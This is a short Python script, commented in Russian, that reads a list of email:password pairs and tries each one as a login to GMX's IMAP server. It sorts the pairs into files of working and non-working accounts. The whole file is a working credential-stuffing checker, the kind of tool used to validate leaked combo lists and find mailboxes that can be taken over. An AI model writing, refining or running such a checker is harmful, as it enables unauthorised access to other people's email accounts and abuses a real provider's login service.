import imaplib

# Пути к файлам
input_file = "mails.txt"
valid_file = "valid_mails.txt"
invalid_file = "invalid_mails.txt"

imap_server = "imap.gmx.com"  # IMAP сервер GMX
port = 993  # Порт IMAP

# Читаем список почт из файла
with open(input_file, "r") as file:
    mails = [line.strip() for line in file.readlines()]

# Открываем файлы для записи результатов
with open(valid_file, "w") as valid, open(invalid_file, "w") as invalid:
    for mail in mails:
        try:
            email, password = mail.split(":")
            mail_conn = imaplib.IMAP4_SSL(imap_server, port)
            mail_conn.login(email, password)
            print(f"✅ Рабочая: {email}")
            valid.write(mail + "\n")
            mail_conn.logout()
        except Exception as e:
            print(f"❌ Нерабочая: {email} - Ошибка: {e}")
            invalid.write(mail + "\n")

print("\n✅ Проверка завершена. Результаты сохранены в файлы:")
print(f"- Рабочие: {valid_file}")
print(f"- Нерабочие: {invalid_file}")
